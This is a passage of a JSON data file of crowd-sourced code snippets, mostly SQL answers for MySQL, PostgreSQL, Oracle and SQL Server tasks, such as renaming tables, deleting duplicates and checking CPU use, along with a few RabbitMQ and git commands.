mycursor.fetchone() mycursor.execute(\"ALTER TABLE Test DROP food\") mycursor.execute(\"ALTER TABLE Test CHANGE name first_name VARCHAR(50)\") db.commit()\nfrom sqlalchemy import create_engineengine = create_engine('sqlite:///:memory:')dff.to_sql('mySQLtable', con = engine)sqldf = pd.read_sql('mySQLtable', con = engine)sqldf\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3404,
    "keyword": null,
    "link": null,
    "title": " query DISTINCT",
    "description": "SELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nSELECT DISTINCT Column_name FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3405,
    "keyword": null,
    "link": null,
    "title": " query any digits record",
    "description": " SELECT kode FROM wilayah WHERE kode LIKE \"__\" ;    # record :  # \t\t11  # \t\t12  # \t\t13  # \t\t14  # \t\t15\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3406,
    "keyword": null,
    "link": null,
    "title": " query current time",
    "description": "CURRENT_TIMESTAMP   \n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3407,
    "keyword": null,
    "link": null,
    "title": " query delete duplicates",
    "description": "DELETE FROM dups a USING (       SELECT MIN(ctid) as ctid, key         FROM dups          GROUP BY key HAVING COUNT(*) > 1       ) b       WHERE a.key = b.key        AND a.ctid <> b.ctid\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3408,
    "keyword": null,
    "link": null,
    "title": " query has no destination for result data",
    "description": "/* you cannot junt do the select, you're supposed to use it in the return as the code below */  CREATE OR REPLACE FUNCTION fun() RETURNS text AS $$ BEGIN     --- ....     RETURN(SELECT dblink_disconnect()); END $$ LANGUAGE plpgsql;\n",
    "reg_date": "2021-10-12T09:59:22.000Z"
  },
  {
    "id": 3409,
    "keyword": null,
    "link": null,
    "title": " query in mysql",
    "description": "SELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3410,
    "keyword": null,
    "link": null,
    "title": " query less than datetime sql",
    "description": "select *   from dbo.March2010 A  where A.Date >= '2010-04-01'\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3411,
    "keyword": null,
    "link": null,
    "title": " query postgres delete duplicates",
    "description": "DELETE FROM dups a USING (       SELECT MIN(ctid) as ctid, key         FROM dups          GROUP BY key HAVING COUNT(*) > 1       ) b       WHERE a.key = b.key        AND a.ctid <> b.ctid\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3412,
    "keyword": null,
    "link": null,
    "title": " query saurce oracle",
    "description": "select * from   all_source where  lower(text) like lower('%Some source%');\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3413,
    "keyword": null,
    "link": null,
    "title": " query string starts with vowels",
    "description": "select city from station where city REGEXP \"^[aeiou].*\";\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3414,
    "keyword": null,
    "link": null,
    "title": " query to check cpu utilization in oracle database",
    "description": "SELECT PARSING_SCHEMA_NAME, MODULE, SQL_ID,  \t   round(((CPU_TIME / 1e6) / 60), 2) AS CPU_TIME,        EXECUTIONS, ROWS_PROCESSED, DISK_READS, FIRST_LOAD_TIME,        LAST_LOAD_TIME, OPTIMIZER_COST, SQL_FULLTEXT FROM V$SQLAREA WHERE PARSING_SCHEMA_NAME IN ('schema_name') ORDER BY PARSING_SCHEMA_NAME, CPU_TIME DESC;\nSELECT ss.USERNAME, se.SID, se.VALUE / 100 CPU_USAGE_SECONDS FROM V$SESSION ss, V$SESSTAT se, V$STATNAME sn WHERE se.STATISTIC# = sn.STATISTIC#   AND NAME LIKE '%CPU used by this session%'   AND se.SID = ss.SID   AND ss.STATUS = 'ACTIVE'   AND ss.USERNAME IS NOT NULL ORDER BY VALUE DESC;\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3415,
    "keyword": null,
    "link": null,
    "title": " query to count the number of rows in a table in sqlalchemy",
    "description": "UserImage.query.filter(UserImage.user_id == 1).count() \n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3416,
    "keyword": null,
    "link": null,
    "title": " query to delete a database in mysql",
    "description": " DROP DATABASE dbname;\nDROP DATABASE ma_base\nmysql> drop database `my-database`; \nDROP DATABASE databasename  TO DELETE DATABASE\nmysql> drop database <db_name>;\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3417,
    "keyword": null,
    "link": null,
    "title": " query to empty table data in sql server",
    "description": "TRUNCATE TABLE  table_name; \n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3418,
    "keyword": null,
    "link": null,
    "title": " query to find 2nd largest salary in sql",
    "description": "SELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);   OR  Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \n/* sql 2nd highest salary employee */ select sal, ename from emp where sal =     (         select max(sal) from emp where sal <             (select max(sal) from emp)     ) ----------------------------------------------- option 2 select * from  (     select ename, sal, dense_rank() over(order by sal desc) rank     from emp ) where rank =2;\nSELECT MAX(salary) FROM Employee WHERE Salary NOT IN ( SELECT Max(Salary) FROM Employee);\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3419,
    "keyword": null,
    "link": null,
    "title": " query to find object dependencies in oracle",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:59:23.000Z"
  },
  {
    "id": 3420,
    "keyword": null,
    "link": null,
    "title": " query to find table size in oracle 12c",
    "description": "SELECT e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME, sum(e.bytes) / 1048576 AS Megs FROM dba_extents e WHERE   e.OWNER = 'SCHEME_NAME' AND   e.TABLESPACE_NAME = 'TBS_NAME' AND   e.SEGMENT_NAME IN ('TABLE_NAME') GROUP BY e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME ORDER BY e.TABLESPACE_NAME, e.SEGMENT_NAME;\n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3421,
    "keyword": null,
    "link": null,
    "title": " query to remove duplicate records in postgresql server",
    "description": "                                     DELETE FROM     basket a         USING basket b WHERE     a.id < b.id     AND a.fruit = b.fruit;\n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3422,
    "keyword": null,
    "link": null,
    "title": " rabbitmq add user",
    "description": "# Replace us3r and passw0rd sudo rabbitmqctl add_user us3r passw0rd # Grant necessary permissions sudo rabbitmqctl set_permissions -p / us3r &ldquo;.*&rdquo; &ldquo;.*&rdquo; &ldquo;.*&rdquo; # Verify permissions sudo rabbitmqctl list_permissions\n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3423,
    "keyword": null,
    "link": null,
    "title": " rabbitmq service not starting",
    "description": "     Run the command prompt as Administrator     Navigate to the sbin directory and uninstall the service. rabbitmq-service remove     Reinstall the service rabbitmq-service install     Enable the plugins. rabbitmq-plugins enable rabbitmq_management     Start the service rabbitmq-service start     Go to \"http://localhost:15672/\"  \n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3424,
    "keyword": null,
    "link": null,
    "title": " rabbitmq ssl docker",
    "description": "docker run -d --hostname rabbit.example.org \\   --name rabbit.example.org \\   -p 127.0.0.1:15672:15672 \\   -p 127.0.0.1:15671:15671 \\   -p 5671:5671 \\   -p 5672:5672 \\   -p 127.0.0.1:4369:4369 \\   -p 127.0.0.1:25672:25672 \\   -e RABBITMQ_DEFAULT_USER=admin \\   -e RABBITMQ_DEFAULT_PASS=LetMe!n \\   -e RABBITMQ_SSL_CERT_FILE=/certs/rabbit.example.org.cert \\   -e RABBITMQ_SSL_KEY_FILE=/certs/rabbit.example.org.key \\   -e RABBITMQ_SSL_CA_FILE=/certs/ca.cert \\   -e RABBITMQ_SSL_FAIL_IF_NO_PEER_CERT=false \\   -e RABBITMQ_SSL_VERIFY=verify_peer \\   -v /srv/ssl/rabbit/:/certs \\   -v /srv/rabbit/:/var/lib/rabbitmq \\   rabbitmq:management-alpine 123456789101112131415161718\n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3425,
    "keyword": null,
    "link": null,
    "title": " rabbitmq ui not working",
    "description": "rabbitmq-plugins enable rabbitmq_management \n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3426,
    "keyword": null,
    "link": null,
    "title": " racle create auto increment column",
    "description": "-- Use a sequence: CREATE SEQUENCE id_seq START WITH 1; INSERT INTO my_table (ID, VALUE) VALUES (id_seq.NEXTVAL, 'My value');\n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3427,
    "keyword": null,
    "link": null,
    "title": " rails execute sql",
    "description": "results = ActiveRecord::Base.connection.exec_query(sql) \n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3428,
    "keyword": null,
    "link": null,
    "title": " raise errors.NotSupportedError( mysql.connector.errors.NotSupportedError: Authentication plugin 'caching sha2 password' is not supported",
    "description": "You have probably installed mysql-connector instead of mysql-connector-python. So you need to install it again for python3:  pip3 install mysql-connector-python \n#To resolve this error just add auth_plugin  import mysql.connector  mydb = mysql.connector.connect(   host=\"localhost\",   user=\"username\",   password=\"password\",   database=\"db name\",   auth_plugin='mysql_native_password' )\n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3429,
    "keyword": null,
    "link": null,
    "title": " raiserror with nowait",
    "description": "-- Show a message immediately to the Messages box. RAISERROR ('Now that''s what I call a message!', 0, 1) WITH NOWAIT\n",
    "reg_date": "2021-10-12T09:59:24.000Z"
  },
  {
    "id": 3430,
    "keyword": null,
    "link": null,
    "title": " random name function in mysql for nvarchar",
    "description": "INSERT INTO vehicles VALUES (blah); -- leaving out the number plate SELECT @lid:=LAST_INSERT_ID(); UPDATE vehicles SET numberplate=concat(   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed:=round(rand(@lid)*4294967296))*36+1, 1),   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed:=round(rand(@seed)*4294967296))*36+1, 1),   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed:=round(rand(@seed)*4294967296))*36+1, 1),   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed:=round(rand(@seed)*4294967296))*36+1, 1),   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed:=round(rand(@seed)*4294967296))*36+1, 1),   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed:=round(rand(@seed)*4294967296))*36+1, 1),   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed:=round(rand(@seed)*4294967296))*36+1, 1),   substring('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', rand(@seed)*36+1, 1) ) WHERE id=@lid;\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3431,
    "keyword": null,
    "link": null,
    "title": " rank function in oracle with example",
    "description": "-- Employees per department, ranked in salary order SELECT EMPNO,        DEPTNO,        SAL,        rank() OVER (PARTITION BY DEPTNO ORDER BY SAL) AS MYRANK FROM EMP;\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3432,
    "keyword": null,
    "link": null,
    "title": " real world example of nosql",
    "description": "One example is analytics.  Lets say you want to build the next Google Analytics. You figure out you want to track IP Address, Browser & Device type. Later you, however, finds out you might want to track Browser Size as well. Since analytics databases can contain millions/billions of data, it isn't so easy to add an extra column to your table. It would simply take too long.  With a NOSQL solution you might just add it to the future rows, without having to change every row in the tracking table.  So in general \"every\" place where you need to crunch data and numbers for report\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3433,
    "keyword": null,
    "link": null,
    "title": " rebuild index oracle",
    "description": "-- Indexes: SELECT 'alter index ' || OWNER || '.' || INDEX_NAME || ' rebuild tablespace '  \t|| TABLESPACE_NAME || ';' SQL_TO_REBUILD_INDEX FROM DBA_INDEXES WHERE STATUS = 'UNUSABLE';\t\t\t-- For unusable indexes  -- Indexes partitions: SELECT 'alter index ' || INDEX_OWNER || '.' || INDEX_NAME  \t|| ' rebuild partition ' || PARTITION_NAME || ' TABLESPACE '      || TABLESPACE_NAME || ';' SQL_TO_REBUILD_INDEX FROM DBA_IND_PARTITIONS WHERE STATUS = 'UNUSABLE';  -- Indexes subpartitions: SELECT 'alter index ' || INDEX_OWNER || '.' || INDEX_NAME  \t|| ' rebuild subpartition ' || SUBPARTITION_NAME || ' TABLESPACE '      || TABLESPACE_NAME || ';' SQL_TO_REBUILD_INDEX FROM DBA_IND_SUBPARTITIONS WHERE STATUS = 'UNUSABLE';\t\t\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3434,
    "keyword": null,
    "link": null,
    "title": " rebuild index sql server",
    "description": "In Object Explorer, Expand the database that contains the table on which you want to reorganize an index. Expand the Tables folder. Expand the table on which you want to reorganize an index. Expand the Indexes folder. Right-click the index you want to reorganize and select Rebuild.\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3435,
    "keyword": null,
    "link": null,
    "title": " redshift running queries",
    "description": "select user_name, db_name, pid, query from stv_recents where status = 'Running';\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3436,
    "keyword": null,
    "link": null,
    "title": " ref cursor for loop in oracle example",
    "description": "-- open the cursor and then fetch and count every row DECLARE     CURSOR c IS SELECT * FROM emp;     cursor_count c%ROWTYPE;     totalrows    NUMBER; BEGIN     OPEN c;     LOOP         FETCH c INTO cursor_count;         dbms_output.put_line('names' || cursor_count.ename);         EXIT WHEN c%NOTFOUND;         END LOOP;     totalrows := c%ROWCOUNT;     dbms_output.put_line('total rows' || totalrows); END;\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3437,
    "keyword": null,
    "link": null,
    "title": " refresh postgres config",
    "description": "SELECT pg_reload_conf(); \n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3438,
    "keyword": null,
    "link": null,
    "title": " regex in sql",
    "description": "SELECT statements... WHERE fieldname REGEXP 'pattern';\n",
    "reg_date": "2021-10-12T09:59:25.000Z"
  },
  {
    "id": 3439,
    "keyword": null,
    "link": null,
    "title": " regex mongoose",
    "description": "db.products.find( { description: { $regex: /string/, $options: 'si' } } ) db.products.find( { 'description.key': { $regex: /string/, $options: 'si' } } ) db.products.find({\"name\" : { $regex:\"Cola\", $options:\"i\" }})\n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3440,
    "keyword": null,
    "link": null,
    "title": " regex starts with",
    "description": "/.*\\.pdf$/\n{ \"Category\" : /^ABC.*/ }\nStart of String or Line: ^  By default, the ^ anchor specifies that the following pattern must begin  at the first character position of the string.\n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3441,
    "keyword": null,
    "link": null,
    "title": " relational database vs non relational",
    "description": "Relational Database = -Tables are structured related to each other -Each specific type of domain data is strored  it's own table  Non-Relational Database = -There is no relation at all between tables -Mostly key+value pair : like jSon\n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3442,
    "keyword": null,
    "link": null,
    "title": " remove all records from table mysql",
    "description": "/* Will delete all rows from your table. Next insert will take next auto increment id. */ DELETE from tableName; /* Will delete all rows from your table but it will start from new row with 1. */ TRUNCATE tableName;\nDELETE FROM table_name;\nTRUNCATE tablename\n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3443,
    "keyword": null,
    "link": null,
    "title": " remove default constraint sql server",
    "description": "ALTER TABLE <schema_name, sysname, dbo>.<table_name, sysname, table_name>    DROP CONSTRAINT <default_constraint_name, sysname, default_constraint_name> GO\n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3444,
    "keyword": null,
    "link": null,
    "title": " remove folders from remote git",
    "description": "git rm -r --cached myFolder \ngit rm -r --cached FolderName git commit -m \"Removed folder from repository\" git push origin master \ngit rm -r one-of-the-directories // This deletes from filesystem git commit . -m \"Remove duplicated directory\" git push origin <your-git-branch> (typically 'master', but not always) \n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3445,
    "keyword": null,
    "link": null,
    "title": " remove mysql from centos 7",
    "description": "sudo yum remove mysql mysql-server\n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3446,
    "keyword": null,
    "link": null,
    "title": " remove mysql workbench ubuntu",
    "description": "sudo apt-get remove mysql-*\n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3447,
    "keyword": null,
    "link": null,
    "title": " remove primary key from a table",
    "description": " alter table Player DROP PRIMARY KEY;\nALTER TABLE Persons  DROP PRIMARY KEY; \n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3448,
    "keyword": null,
    "link": null,
    "title": " remove primary key from table",
    "description": "ALTER TABLE Persons  DROP PRIMARY KEY; \n",
    "reg_date": "2021-10-12T09:59:26.000Z"
  },
  {
    "id": 3449,
    "keyword": null,
    "link": null,
    "title": " remove spaces sql server",
    "description": "SELECT REPLACE(' Hello World ',' ','')\nSELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\nSELECT RTRIM(LTRIM(' Word ')) \nSELECT REPLACE(' Hello World ',' ')\n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3450,
    "keyword": null,
    "link": null,
    "title": " remove special characters mysql",
    "description": "usertable +----+-----------+ | Id | Name      | +----+-----------+ |  1 | $John     | |  2 | $Carol    | |  3 | $Mike     |  |  4 | $Sam      | |  5 | $Dav$id$  | |  6 | Robert$   | |  7 | J$ames$   | |  8 | Max$well$ | +----+-----------+ 8 rows in set (0.00 sec)  #Update table by replacing \"$\" with \"\" (nothing). update usertable set Name=replace(Name,'$','');  Query OK, 8 rows affected (0.22 sec) Rows matched: 8 Changed: 8 Warnings: 0  #Query table to confirm changes. SELECT * FROM usertable  +----+---------+ | Id | Name    | +----+---------+ |  1 | John    | |  2 | Carol   | |  3 | Mike    | |  4 | Sam     | |  5 | David   | |  6 | Robert  | |  7 | James   | |  8 | Maxwell | +----+---------+ 8 rows in set (0.00 sec)  \n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3451,
    "keyword": null,
    "link": null,
    "title": " remove time from date sql",
    "description": "First thing's first, if your dates are in varchar format change that, store dates as dates it will save you a lot of headaches and it is something that is best done sooner rather than later. The problem will only get worse.  Secondly, once you have a date DO NOT convert the date to a varchar! Keep it in date format and use formatting on the application side to get the required date format.  There are various methods to do this depending on your DBMS:  SQL-Server 2008 and later:  SELECT  CAST(CURRENT_TIMESTAMP AS DATE) SQL-Server 2005 and Earlier  SELECT  DATEADD(DAY, DATEDIFF(DAY, 0, CURRENT_TIMESTAMP), 0) SQLite  SELECT  DATE(NOW()) Oracle  SELECT  TRUNC(CURRENT_TIMESTAMP) Postgresql  SELECT  CURRENT_TIMESTAMP::DATE If you need to use culture specific formatting in your report you can either explicitly state the format of the receiving text box (e.g. dd/MM/yyyy), or you can set the language so that it shows the relevant date format for that language.  Either way this is much better handled outside of SQL as converting to varchar within SQL will impact any sorting you may do in your report.  If you cannot/will not change the datatype to DATETIME, then still convert it to a date within SQL (e.g. CONVERT(DATETIME, yourField)) before sending to report services and handle it as described above.\nSELECT CONVERT(varchar(8), GETDATE(), 108) AS TimeOnly CONVERT(VARCHAR(7),@AppDate,111) date year only\n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3452,
    "keyword": null,
    "link": null,
    "title": " remove transient options sql wordpress",
    "description": "DELETE FROM `wp_options` WHERE `option_name` LIKE ('%\\_transient\\_%') \n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3453,
    "keyword": null,
    "link": null,
    "title": " remove unique key from a table",
    "description": "ALTER TABLE mytable DROP INDEX key_Name;\nDROP INDEX index_name ON tbl_name\nexample: alter table DropIndex drop index BookId ;\n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3454,
    "keyword": null,
    "link": null,
    "title": " rename azure database",
    "description": "USE master;   GO   ALTER DATABASE MyTestDatabase SET SINGLE_USER WITH ROLLBACK IMMEDIATE GO ALTER DATABASE MyTestDatabase MODIFY NAME = MyTestDatabaseCopy ; GO   ALTER DATABASE MyTestDatabaseCopy SET MULTI_USER GO \n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3455,
    "keyword": null,
    "link": null,
    "title": " rename column ORACLE",
    "description": "alter table sales rename column order_date to date_of_order;\nALTER TABLE my_table RENAME COLUMN old_name TO new_name;  -- To check if column exists before renaming it: DECLARE     l_cnt INTEGER; BEGIN     SELECT count(*) INTO l_cnt     FROM dba_tab_columns\t\t-- or all_tab_columns (depending on grants)     WHERE owner = 'my_schema' AND table_name = 'my_table'      \tAND column_name = 'my_col';     IF (l_cnt = 1) THEN         EXECUTE IMMEDIATE 'ALTER TABLE my_table          \tRENAME COLUMN my_col TO my_new_name';     END IF; END;\nALTER TABLE table_name   RENAME COLUMN old_name TO new_name;\n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3456,
    "keyword": null,
    "link": null,
    "title": " rename column mysql",
    "description": "RENAME TABLE tb1 TO tb2;\nRENAME TABLE old_table TO new_table;\nALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` varchar(100) NOT NULL;\nRENAME TABLE old_table_name TO new_table_name; \t\t\t\t\tor ALTER TABLE old_table_name RENAME TO new_table_name;  \t\t\t\t\tor ALTER TABLE old_table_name RENAME new_table_name;                 \nRENAME TABLE old_name TO new_name; -- or ALTER TABLE old_name RENAME TO new_name;  -- or ALTER TABLE old_name RENAME new_name;                 \nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length); (you can remove the backticks if it doesn't work)\n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3457,
    "keyword": null,
    "link": null,
    "title": " rename column postgres",
    "description": "ALTER TABLE table_name RENAME TO new_table_name;\nALTER TABLE table_name  RENAME column_name TO new_column_name;\nALTER TABLE customers  RENAME COLUMN name TO customer_name;  ALTER TABLE customers RENAME COLUMN phone TO contact_phone; \nALTER TABLE distributors RENAME COLUMN address TO city;\nALTER TABLE order_details   RENAME TO order_information;\nALTER TABLE order_details   DROP COLUMN notes;\n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3458,
    "keyword": null,
    "link": null,
    "title": " rename column sql",
    "description": "--The following example renames the column TerritoryID in the table Sales.SalesTerritory to TerrID in the AdventureWorks database.  EXEC sp_rename 'Sales.SalesTerritory.TerritoryID', 'TerrID', 'COLUMN';\nALTER TABLE STUDENTS   RENAME TO ARTISTS;  \nEXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nEXEC sp_RENAME 'table_name.old_name', 'new_name', 'COLUMN' \nALTER TABLE nom_table RENAME COLUMN colonne_ancien_nom TO colonne_nouveau_nom\n",
    "reg_date": "2021-10-12T09:59:27.000Z"
  },
  {
    "id": 3459,
    "keyword": null,
    "link": null,
    "title": " rename constraint postgresql",
    "description": "ALTER INDEX commerce_contractor_pkey RENAME TO whatever_new_name \n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3460,
    "keyword": null,
    "link": null,
    "title": " rename stored procedure in sql server",
    "description": "--Rename the stored procedure.   EXEC sp_rename 'OldName', 'NewName'; \n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3461,
    "keyword": null,
    "link": null,
    "title": " rename table column name in mysql",
    "description": "ALTER TABLE table_name CHANGE old_column_name new_column_name datatype(length);\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3462,
    "keyword": null,
    "link": null,
    "title": " rename table in mysql",
    "description": "RENAME TABLE tb1 TO tb2;\nRENAME TABLE old_table TO new_table;\nRENAME TABLE old_table_name TO new_table_name; \t\t\t\t\tor ALTER TABLE old_table_name RENAME TO new_table_name;  \t\t\t\t\tor ALTER TABLE old_table_name RENAME new_table_name;                 \nRENAME TABLE old_name TO new_name; -- or ALTER TABLE old_name RENAME TO new_name;  -- or ALTER TABLE old_name RENAME new_name;                 \nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length); (you can remove the backticks if it doesn't work)\nBecause business requirements change, we need to rename the current table to a new one to better reflect the new situation. MySQL provides us with a very useful statement that changes the name of one or more tables.  To change one or more tables, we use the RENAME TABLE statement as follows:  RENAME TABLE old_table_name TO new_table_name; The old table ( old_table_name) must exist, and the new table ( new_table_name) must not. If the new table new_table_name does exist, the statement will fail.  In addition to the tables, we can use the RENAME TABLE statement to rename views.\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3463,
    "keyword": null,
    "link": null,
    "title": " rename table postgres",
    "description": "ALTER TABLE table_name RENAME TO new_table_name;\nALTER TABLE table_name  RENAME column_name TO new_column_name;\nALTER TABLE customers  RENAME COLUMN name TO customer_name;  ALTER TABLE customers RENAME COLUMN phone TO contact_phone; \nALTER TABLE distributors RENAME COLUMN address TO city;\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3464,
    "keyword": null,
    "link": null,
    "title": " rename table sql",
    "description": "ALTER TABLE STUDENTS   RENAME TO ARTISTS;  \nUSE AdventureWorks2012;    GO   EXEC sp_rename 'Sales.SalesTerritory', 'SalesTerr';   \nEXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nEXEC sp_RENAME 'table_name.old_name', 'new_name', 'COLUMN' \nALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3465,
    "keyword": null,
    "link": null,
    "title": " rename table sql server",
    "description": "ALTER TABLE STUDENTS   RENAME TO ARTISTS;  \nUSE AdventureWorks2012;    GO   EXEC sp_rename 'Sales.SalesTerritory', 'SalesTerr';   \nEXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nEXEC sp_RENAME 'table_name.old_name', 'new_name', 'COLUMN' \nALTER TABLE exampletable RENAME TO new_table_name;\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3466,
    "keyword": null,
    "link": null,
    "title": " rename table sqlite",
    "description": "ALTER TABLE existing_table RENAME TO new_table;\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3467,
    "keyword": null,
    "link": null,
    "title": " renombrar tabla mysql",
    "description": "RENAME TABLE nombre_tabla TO nombre_nuevo_tabla [, nombre_tabla2 TO nombre_nuevo_tabla2] ... \n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3468,
    "keyword": null,
    "link": null,
    "title": " renommer base sql",
    "description": "ALTER DATABASE MyTestDatabase MODIFY NAME = MyTestDatabaseCopy ;\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3469,
    "keyword": null,
    "link": null,
    "title": " renommer table sql",
    "description": "alter table bad_name rename to good_name;\n",
    "reg_date": "2021-10-12T09:59:28.000Z"
  },
  {
    "id": 3470,
